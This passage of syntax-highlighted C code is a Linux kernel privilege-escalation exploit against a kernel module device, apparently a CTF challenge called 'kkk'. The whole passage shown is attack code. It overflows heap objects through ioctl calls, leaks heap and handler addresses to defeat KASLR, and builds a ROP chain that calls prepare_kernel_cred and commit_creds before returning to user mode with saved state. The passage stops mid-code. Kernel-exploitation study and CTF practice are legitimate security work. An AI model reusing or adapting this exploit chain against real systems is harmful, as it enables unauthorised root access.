<span class="kt">uint64_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">privileged_function</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">save_state</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;.intel_syntax noprefix;&#34;</span>
            <span class="s">&#34;mov user_cs, cs;&#34;</span>
            <span class="s">&#34;mov user_ss, ss;&#34;</span>
            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
            <span class="s">&#34;pushf;&#34;</span>
            <span class="s">&#34;pop user_rflags;&#34;</span>
            <span class="s">&#34;.att_syntax&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span> <span class="n">add_arg</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span> <span class="n">other_arg</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="c1">// ============ LEAK ============
</span><span class="c1"></span>    <span class="c1">// 1 - open
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/kkk&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// 2 - add two adjacent objects
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">450</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="c1">// bruteforce result here
</span><span class="c1"></span>    <span class="c1">// # prefix b&#39;\xee)\xa4\xbd\x9a.&#39; support value 1022
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xee</span><span class="s">)</span><span class="se">\xa4\xbd\x9a</span><span class="s">.&#34;</span><span class="p">,</span> <span class="mi">14</span><span class="p">);</span>

    <span class="n">add_arg</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">KKK_CRYPTO_DES</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">enc</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">450</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">add_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span> <span class="c1">// 2 bytes misaligan :)
</span><span class="c1"></span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// make the kernel stack bigger enough
</span><span class="c1"></span>    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_ADD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">add_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_ADD&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// then we try to overflow with launch
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_LAUNCH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_LAUNCH&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// the id&#39;1 keysize will now be extremely large
</span><span class="c1"></span>    <span class="c1">// dump it
</span><span class="c1"></span>    <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">keybuf</span><span class="p">[</span><span class="mi">65535</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">databuf</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">keybuf</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_DUMP</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// since keylength is 450
</span><span class="c1"></span>    <span class="c1">//       data is 14
</span><span class="c1"></span>    <span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="n">obj</span> <span class="o">=</span> <span class="n">keybuf</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;leaked:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;key heap address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">keypack</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;data heap address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">datapack</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;handler adddress: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_kaslroffset</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">-</span> <span class="mh">0xffffffffc0000510ul</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;module kaslr offset: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">module_kaslroffset</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_load_address</span> <span class="o">=</span> <span class="mh">0xffffffffc0000000ul</span> <span class="o">+</span> <span class="n">module_kaslroffset</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;module loaded at: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">module_load_address</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kkk_fops_address</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">module_kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kkk_fops_size</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span> <span class="c1">// 16 is enough
</span><span class="c1"></span>
    <span class="c1">// we hence exploit third chunks key and data ptr to read kkk_fops
</span><span class="c1"></span>    <span class="kt">char</span> <span class="n">updatedkey</span><span class="p">[</span><span class="mh">0x3fe</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="c1">// key size
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kkk_fops_size</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// overflow key pointer
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kkk_fops_address</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">updatedkey</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_UPDATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_DUMP</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_DUMP&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">no_llseek_address</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">no_llseek_address</span><span class="p">,</span> <span class="n">key</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;no_llseek address: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">no_llseek_address</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">no_llseek_address</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// buggy hence drop
</span><span class="c1"></span>        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kaslroffset</span> <span class="o">=</span> <span class="n">no_llseek_address</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0ul</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;core KASLR offset: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kaslroffset</span><span class="p">);</span>

    <span class="c1">// recover third chunk key size and data ??? need to?
</span><span class="c1"></span>    <span class="c1">// starts ROP 
</span><span class="c1"></span>    <span class="n">save_state</span><span class="p">();</span>
    
    <span class="c1">// 0xffffffff8106df19: mov rsp, qword ptr [rsp + 0x20]; pop rbx; pop rbp; ret;
</span><span class="c1"></span>    <span class="n">memset</span><span class="p">(</span><span class="n">updatedkey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">updatedkey</span><span class="p">));</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">updatedkey</span><span class="p">;</span>
    <span class="n">other_arg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">databuf</span><span class="p">;</span>

    <span class="c1">// third need to be placed ROP stuff in key
</span><span class="c1"></span>    <span class="c1">// POC: try printk as an example
</span><span class="c1"></span>    <span class="c1">// 0xffffffff81001614: pop rdi; ret;
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PIVOT_GADGET</span> <span class="o">=</span> <span class="mh">0xffffffff8106df19ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">POP_RDI_GADGET</span> <span class="o">=</span> <span class="mh">0xffffffff81001614ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RBX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RBP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">RDI_PRINTK_ARG</span> <span class="o">=</span> <span class="n">obj</span><span class="o">-&gt;</span><span class="n">datapack</span><span class="p">.</span><span class="n">ptr</span><span class="p">;</span>
    <span class="c1">// ffffffff81c5e83f T _printk
</span><span class="c1"></span>    <span class="c1">// why my printk is a lot of mess
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PRINTK</span> <span class="o">=</span> <span class="mh">0xffffffff81c5e83ful</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// ffffffff8109bf90 T prepare_kernel_cred
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">PREPARE_KERNEL_CRED</span> <span class="o">=</span> <span class="mh">0xffffffff8109bf90ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// ffffffff8109bcf0 T commit_creds
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">COMMIT_CREDS</span> <span class="o">=</span> <span class="mh">0xffffffff8109bcf0ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// 0xffffffff8126a99e &lt;mark_buffer_dirty+254&gt;:	test   edi,esi
</span><span class="c1"></span>    <span class="c1">// this possibly can change the flag
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">TEST_ESI_EDI</span> <span class="o">=</span> <span class="mh">0xffffffff8126a99eul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// 0xffffffff8162fc5b: mov rdi, rax; jne 0x630c33; mov eax, ebx; pop rbx; pop rbp; ret
</span><span class="c1"></span>    <span class="c1">// can we use this one (without jump) need to debug
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">MOV_RDI_RAX</span> <span class="o">=</span> <span class="mh">0xffffffff8162fc5bul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>

    <span class="c1">// the pivot gadget will pop rbx and rbp,
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PIVOT_GADGET</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBP</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// prepare 0 to RDI
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">POP_RDI_GADGET</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// return to prepare_kernel_creds
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PREPARE_KERNEL_CRED</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// now the rax is the argument, move it to tdi
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TEST_ESI_EDI</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">48</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">MOV_RDI_RAX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// two additional POP here
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">56</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RBP</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// return to commit_creds
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">72</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">COMMIT_CREDS</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="c1">// !!! TODO: we have to take care of the stack recover and ret2usr
</span><span class="c1"></span>    <span class="c1">// learn about the kernel stack mechanism
</span><span class="c1"></span>    <span class="c1">// ffffffff81e00e10 T swapgs_restore_regs_and_return_to_usermode
</span><span class="c1"></span>    <span class="c1">// 0xffffffff81e00e10 &lt;common_interrupt_return&gt;:	pop    r15
</span><span class="c1"></span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_restore_movq</span> <span class="o">=</span> <span class="mh">0xffffffff81e00e26ul</span> <span class="o">+</span> <span class="n">kaslroffset</span><span class="p">;</span>
    <span class="c1">// to swapgs_restore_regs_and_return_to_usermode
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">80</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">swapgs_restore_movq</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// fake returning stack
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">retRAX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">retRDI</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">// reverse
</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">88</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">retRAX</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">96</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">retRDI</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">104</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_rip</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">112</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_cs</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">120</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_rflags</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">128</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_sp</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">updatedkey</span> <span class="o">+</span> <span class="mi">450</span> <span class="o">+</span> <span class="mi">14</span> <span class="o">+</span> <span class="mi">48</span> <span class="o">+</span> <span class="mi">136</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_ss</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="c1">// shall this enough
</span><span class="c1"></span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">KKK_IOCTL_UPDATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">other_arg</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;KKK_IOCTL_UPDATE&#34;</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">leave</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// we belive the third chunk is corrupted now
</span><span class="c1"></span>    <span class="n">other_arg</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="c1">// uses this to pivot gadget to heap
